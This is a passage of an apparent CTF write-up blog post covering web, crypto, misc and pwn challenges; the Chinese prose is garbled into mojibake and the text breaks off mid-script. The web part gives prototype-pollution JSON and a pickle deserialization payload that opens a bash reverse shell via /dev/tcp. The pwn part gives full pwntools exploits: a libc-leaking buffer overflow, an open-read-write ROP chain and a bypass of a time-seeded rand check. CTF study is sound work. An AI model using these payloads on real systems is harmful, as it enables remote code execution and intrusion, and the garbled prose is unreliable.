class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;secret_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123456&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Ê±°Êüì<code>secret_key</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094025395-485307447.png" alt="image-20241019162519604"></p><p>‰πãÂêéjwt‰º™ÈÄ†</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094030306-835463532.png" alt="image-20241019162618743"></p><p>ÂÜçÊ±°Êüì</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_names&quot;</span> <span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;getattr&quot;</span><span class="punctuation">,</span><span class="string">&quot;system&quot;</span><span class="punctuation">,</span><span class="string">&quot;dict&quot;</span><span class="punctuation">,</span><span class="string">&quot;globals&quot;</span><span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line">Âíå</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;__init__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__globals__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;safe_modules&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;builtins&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>‰πãÂêéÊ†πÊçÆ<a href="https://goodapple.top/archives/1069">ÂçöÂÆ¢</a>ÈáåÈù¢ÁªïËøá<code>builtins</code>ÁöÑ‰æãÂ≠êÂÜô<code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data=<span class="string">&#x27;&#x27;&#x27;cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(cbuiltins</span></span><br><span class="line"><span class="string">dict</span></span><br><span class="line"><span class="string">S&#x27;get&#x27;</span></span><br><span class="line"><span class="string">tR(cbuiltins</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;builtins&#x27;</span></span><br><span class="line"><span class="string">tRp1</span></span><br><span class="line"><span class="string">cbuiltins</span></span><br><span class="line"><span class="string">getattr</span></span><br><span class="line"><span class="string">(g1</span></span><br><span class="line"><span class="string">S&#x27;eval&#x27;</span></span><br><span class="line"><span class="string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;)&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span>.encode()</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dddd.pkl&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Type of &#x27;data&#x27;: <span class="subst">&#123;<span class="built_in">type</span>(data)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Module of &#x27;data&#x27;: <span class="subst">&#123;data.__module__ <span class="keyword">if</span> <span class="built_in">hasattr</span>(data, <span class="string">&#x27;__module__&#x27;</span>) <span class="keyword">else</span> <span class="string">&#x27;N/A&#x27;</span>&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>‰∏ä‰º†Âç≥ÂèØ</p><p>PS:ËøôshellÂºπÁöÑÂ§™ÊÖ¢‰∫Ü,ÊàëËøò‰ª•‰∏∫ÁéØÂ¢ÉÊ≠ª‰∫ÜÂ∑ÆÁÇπÂÖ≥‰∫Ü‚Ä¶</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094112459-1685459773.png" alt="image-20241019162930878"></p><h1>Crypto</h1><h2 id="xor">xor</h2><p>È¢òÁõÆÊèèËø∞</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimic is a keyword.</span><br><span class="line"><span class="number">0</span>b<span class="number">050</span><span class="keyword">c</span><span class="number">0e180</span>e<span class="number">585</span>f<span class="number">5</span><span class="keyword">c</span><span class="number">52555</span><span class="keyword">c</span><span class="number">5544545</span><span class="keyword">c</span><span class="number">0</span>a<span class="number">0</span>f<span class="number">44535</span>f<span class="number">0</span>f<span class="number">5e445658595844050</span>f<span class="number">5</span>d<span class="number">0</span>f<span class="number">0</span>f<span class="number">55590</span><span class="keyword">c</span><span class="number">555e5</span>a<span class="number">0914</span></span><br></pre></td></tr></table></figure><p>Áõ¥Êé•ÁªôgptÔºåÁßí‰∫Ü</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094135992-1445668991.png" alt="image-20241019163249407"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094156218-2020019155.png" alt="image-20241019163313547"></p><h1>Misc</h1><h2 id="ezflag">ezflag</h2><p>Ëß£ÂéãÂéãÁº©ÂåÖÊúâ‰∏™ÊµÅÈáèÂåÖ,ÊãøÂ∑•ÂÖ∑Ë∑ëÂá∫Êù•‰∏Ä‰∏™ÂéãÁº©ÂåÖ</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094229732-112185337.png" alt="image-20241019163729644"></p><p>Ëß£ÂéãÂêéÊúâ‰∏™<code>flag.zip</code>Ôºå‰ΩÜÊòØËß£Âéã‰∏çÂá∫Êù•ÔºåÊãøfileÁúã‰∏Ä‰∏ãÂèëÁé∞ÊòØ‰∏Ä‰∏™png</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094425840-1389928001.png" alt="image-20241019163915023"></p><p>‰πãÂêéÊîπ‰∏Ä‰∏ãÂêéÁºÄÂç≥ÂèØÂæóÂà∞flag</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241021094352731-1655859914.png" alt="image-20241019163906271"></p><h1>pwn</h1><h2 id="signin-revenge">signin revenge</h2><h3 id="È¢òÁõÆlibcÁéØÂ¢É">È¢òÁõÆlibcÁéØÂ¢É</h3><blockquote><p>ÈÇ£ÈÅìÈ¢òÁõÆÁöÑÊó∂ÂÄôÔºåÂèëÁé∞È¢òÁõÆÊòØÁõ¥Êé•Ë∑ë‰∏çËµ∑Êù•ÁöÑ„ÄÇÂºÄÂßã‰ª•‰∏∫ÊòØÊ≤ôÁÆ±ÁöÑÈóÆÈ¢òÔºåËøòÊòØÂ§™Ëèú‰∫Ü„ÄÇÂÖ∂ÂÆûÊõ¥Êç¢È¢òÁõÆlibcÁéØÂ¢ÉÁöÑÈóÆÈ¢ò</p><p>ËøôÈáåË∑üÊç¢‰∏Ä‰∏ãÈ¢òÁõÆÁöÑlibcÁéØÂ¢ÉÔºå</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed  libc.so.6 ./libc.so.6 vuln</span><br><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2  vuln</span><br></pre></td></tr></table></figure><p>ldd vulnÊü•Áúã‰∏Ä‰∏ãÊõ¥Êç¢ÊòØÂê¶ÊàêÂäü„ÄÇ</p><p>ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Ê≠£Â∏∏ËøêË°å‰∫Ü„ÄÇ</p><p>Ë∏©ÂùëÁÇπÔºöÊ≥®ÊÑèË¶ÅÊääÁªôÂÆöÁöÑlibcÊñá‰ª∂ËøõË°åÊéàÊùÉ„ÄÇÂπ∂‰∏îË¶ÅÂú®ÁÆ°ÁêÜÂëòÊ®°Âºè‰∏ãÊéàÊùÉ„ÄÇ</p><p>ËøôÈáåÊ≥®ÊÑè‰∏çÊç¢‰πüË°åÔºåÊ≠£Â∏∏ÊâìËøúÁ®ãÂ∫îËØ•‰∏çÂΩ±ÂìçÂÅöÈ¢òÔºå‰ΩÜÊòØÂ§çÁé∞Ë∑ëÊú¨Âú∞Â∞±‰ºöÈÅáÂà∞È∫ªÁÉ¶‰∫Ü„ÄÇ‰ΩÜÊòØÂ¶ÇÊûúÊòØ‰Ω†ÊòØkaliÁöÑËØù„ÄÇÊää‰ªñ‰ø©ÊîæÂú®Âêå‰∏ÄÊñá‰ª∂‰∏ãkali‰ºöËá™Ë°åÂåπÈÖçldÊñá‰ª∂ÂíålibcÊñá‰ª∂</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/Ê°åÈù¢/ÂïäÂ∏ÉÊãâÂ∏ÉÊãâ/<span class="number">11111</span>$ ldd vuln</span><br><span class="line">linux-vdso.so<span class="number">.1</span> (<span class="number">0x00007fff6fb85000</span>)</span><br><span class="line">./libc.so<span class="number">.6</span> (<span class="number">0x00007fce115dc000</span>)    <span class="comment">//---------------------------------------------&gt;&gt;&gt;ldÊñá‰ª∂</span></span><br><span class="line">./ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> =&gt; /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span> (<span class="number">0x00007fce117d0000</span>)<span class="comment">//-------&gt;&gt;&gt;libcÊñá‰ª∂</span></span><br><span class="line">bbq@ubuntu:~/Ê°åÈù¢/ÂïäÂ∏ÉÊãâÂ∏ÉÊãâ/<span class="number">11111</span>$ </span><br></pre></td></tr></table></figure></blockquote><p>ÂÖàÊó•Â∏∏Ê£ÄÊü•‰∏Ä‰∏ã</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/Ê°åÈù¢/ÂïäÂ∏ÉÊãâÂ∏ÉÊãâ/11111/2222$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/Ê°åÈù¢/ÂïäÂ∏ÉÊãâÂ∏ÉÊãâ/11111/2222/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">bbq@ubuntu:~/Ê°åÈù¢/ÂïäÂ∏ÉÊãâÂ∏ÉÊãâ/11111/2222$ </span><br></pre></td></tr></table></figure><p>Ê≠£Â∏∏ÁöÑNXÂíågotË°®ÂèØÂÜô</p><p>‰∏¢ËøõidaÈáåÈù¢ÁúãÁúã</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">init</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">sandbox</span>();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;lets move and pwn!&quot;</span>);</span><br><span class="line">  <span class="built_in">vuln</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x130</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøõÂéªÂèØ‰ª•ÊòéÊòæÁöÑÁúãËßÅ‰∏Ä‰∏™Ê≤ôÁÆ±ÂáΩÊï∞ÂíåÊàë‰ª¨ÊâÄË¶ÅÁ∫ØÂú®ÊºèÊ¥ûÁöÑreadÂáΩÊï∞</p><p>ÁÆÄÂçïÁúã‰∏Ä‰∏ãÊ≤ôÁÆ±ÂáΩÊï∞</p><p>ËøôÈáåÊàëÈóÆ‰∫Ü‰∏Ä‰∏ãgptÔºåÂÖ∂ÂÆûÂ§ßÊ¶ÇÊàëÁöÑÁêÜËß£Â∞±ÊòØÊèêÈÜíÊàë‰ª¨‰ΩøÁî®ORW</p><h3 id="ORW">ORW</h3><p>È¶ñÂÖàÈÄöËøá<code>openÂáΩÊï∞</code>Âêë<code>bssÊÆµ‰∏ä</code>‰∏≠ÂÜôÂÖ•<code>b'./flag\x00\x00'</code>ÔºåÂπ∂Â∞Ü<code>b'./flag\x00\x00'</code>‰Ωú‰∏∫<code>openÂáΩÊï∞</code>ÁöÑÂèÇÊï∞ÔºåÊûÑÈÄ†<code>open(b'./flag\x00\x00')</code>Áî®Êù•ÊâìÂºÄÂΩìÂâçÁõÆÂΩïÂêç‰∏∫flagÁöÑÊñá‰ª∂ÔºåÂÖ∂‰∏≠0Ë°®Á§∫Âè™ËØªÊñπÂºèÊâìÂºÄ„ÄÇÁÑ∂ÂêéÊûÑÈÄ† <code>read(3, name_addr, 0x50)</code> Â∞Ü flag ÂÜÖÂÆπÂÜôÂÖ•Âà∞ <code>name</code> ÁöÑÂú∞ÂùÄÂ§ÑÔºåÂÜçÈÄöËøáÊûÑÈÄ† <code>write(1, name_addr, 0x50)</code> Â∞Ü flag ÂÜÖÂÆπ‰ªé <code>name</code> ÁöÑÂú∞ÂùÄÂ§ÑËæìÂá∫Âà∞ÁªàÁ´Ø„ÄÇ</p><p>ÂØÑÂ≠òÂô®ÁöÑÂÅèÁßªÊü•Êâæ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./libc.so.6 --only  <span class="string">&#x27;pop|ret&#x27;</span></span><br></pre></td></tr></table></figure><p>ROPÈìæÂ∞±ÊòØ‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑÊ≥ÑÈú≤libcÂü∫ÂùÄÈìæ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span>*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span></span></span><br><span class="line"><span class="function">libc</span>=<span class="built_in">ELF</span>(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=<span class="built_in">ELF</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="meta">#p=remote(<span class="string">&quot;pwn-d929761f60.challenge.xctf.org.cn&quot;</span>, 9999, ssl=True)</span></span><br><span class="line">p = <span class="built_in">process</span>(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi=<span class="number">0x0000000000401393</span></span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>+<span class="number">8</span>)+<span class="built_in">p64</span>(rdi)+<span class="built_in">p64</span>(elf.got[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+<span class="built_in">p64</span>(<span class="number">0x4012F0</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"></span><br><span class="line">libc_base=<span class="built_in">u64</span>(p.<span class="built_in">recvuntil</span>(<span class="string">&quot;\x7f&quot;</span>)[<span class="number">-6</span>:].<span class="built_in">ljust</span>(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">rdi = libc_base+<span class="number">0x0000000000023b6a</span></span><br><span class="line">rsi = libc_base+<span class="number">0x000000000002601f</span></span><br><span class="line">rdx = libc_base+<span class="number">0x0000000000142c92</span></span><br><span class="line">rdx_r12=libc_base+<span class="number">0x0000000000119211</span></span><br><span class="line">rax = libc_base+<span class="number">0x0000000000036174</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000022679</span></span><br><span class="line">syscall=libc_base+<span class="number">0x000000000002284d</span></span><br><span class="line">open_=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read=libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write=libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">mprotect=libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">bss=<span class="number">0x404060</span>+<span class="number">0x500</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">p.<span class="built_in">recvuntil</span>(<span class="string">&quot;lets move and pwn!&quot;</span>)</span><br><span class="line">payload=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*(<span class="number">0x100</span>)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss)+<span class="built_in">p64</span>(read)+<span class="built_in">p64</span>(<span class="number">0x4012EE</span>)</span><br><span class="line"><span class="meta">#bug()</span></span><br><span class="line">p.<span class="built_in">send</span>(payload)</span><br><span class="line"><span class="meta">#pause()</span></span><br><span class="line">orw  = b<span class="number">&#x27;</span>/flag\x00\x00\x00<span class="number">&#x27;</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(bss)  #/flagÁöÑÂ≠óÁ¨¶‰∏≤‰ΩçÁΩÆÔºåË¶ÅÊîπ</span><br><span class="line">orw += <span class="built_in">p64</span>(rsi) + <span class="built_in">p64</span>(<span class="number">0</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(open_)</span><br><span class="line"></span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">3</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #ËØªÂÖ•flagÁöÑ‰ΩçÁΩÆ</span><br><span class="line">orw += <span class="built_in">p64</span>(read)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdi) + <span class="built_in">p64</span>(<span class="number">1</span>)</span><br><span class="line">orw += <span class="built_in">p64</span>(rdx_r12) + <span class="built_in">p64</span>(<span class="number">0x50</span>)*<span class="number">2</span></span><br><span class="line">orw += <span class="built_in">p64</span>(rsi)+<span class="built_in">p64</span>(bss+<span class="number">0x200</span>) #ËØªÂÖ•flagÁöÑ‰ΩçÁΩÆ</span><br><span class="line">orw += <span class="built_in">p64</span>(write)</span><br><span class="line"></span><br><span class="line"><span class="meta">#pr(hex(len(orw)))</span></span><br><span class="line">p.<span class="built_in">send</span>(orw)</span><br><span class="line"></span><br><span class="line">p.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure><h2 id="signin">signin</h2><p>Êó•Â∏∏Ê£ÄÊü•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bbq@ubuntu:~/Ê°åÈù¢/ÂïäÂ∏ÉÊãâÂ∏ÉÊãâ/11111$ checksec vuln</span><br><span class="line">[*] <span class="string">&#x27;/home/bbq/Ê°åÈù¢/ÂïäÂ∏ÉÊãâÂ∏ÉÊãâ/11111/vuln&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3f7000)</span><br><span class="line">bbq@ubuntu:~/Ê°åÈù¢/ÂïäÂ∏ÉÊãâÂ∏ÉÊãâ/11111$ </span><br></pre></td></tr></table></figure><p>‰∏§ÈÅìÈ¢òÂá†‰πé‰∏ÄÊ†∑Ôºå‰ΩÜÊòØËøôÈÅìÈ¢òÂ§ö‰∫ÜÂá†‰∏™ÁªïËøáÂíå‰º™ÈöèÊú∫Êï∞ÁªïËøá</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)   </span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&quot;pwn-ecdfbe9bc0.challenge.xctf.org.cn&quot;, 9999, ssl=True)</span></span><br><span class="line">p=process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xun</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        p.recvuntil(<span class="string">b&#x27;Input the authentication code:&#x27;</span>)</span><br><span class="line">       <span class="comment">#payload = str((elf1.rand()%100) + 1)</span></span><br><span class="line">       <span class="comment">#p.send(payload)</span></span><br><span class="line">        p.send(p64(elf1.rand()%<span class="number">100</span>+<span class="number">1</span>))</span><br><span class="line">       </span><br><span class="line">       <span class="comment"># sleep(0.1)</span></span><br><span class="line">     </span><br><span class="line">       </span><br><span class="line">rdi=<span class="number">0x0000000000401893</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause</span></span><br><span class="line">p.send(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">elf1=ctypes.CDLL(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#elf1=ctypes.LoadLibrary(&quot;./libc.so.6&quot;)</span></span><br><span class="line">elf1.srand(elf1.time(<span class="number">0</span>))    <span class="comment">#‰∏éÈ¢òÁõÆÁõ∏Âêå‰ª•Êó∂Èó¥‰∏∫ÁßçÂ≠ê</span></span><br><span class="line"></span><br><span class="line">xun()</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>,p32(<span class="number">1</span>))</span><br><span class="line">p.sendafter(<span class="string">&quot;Index: 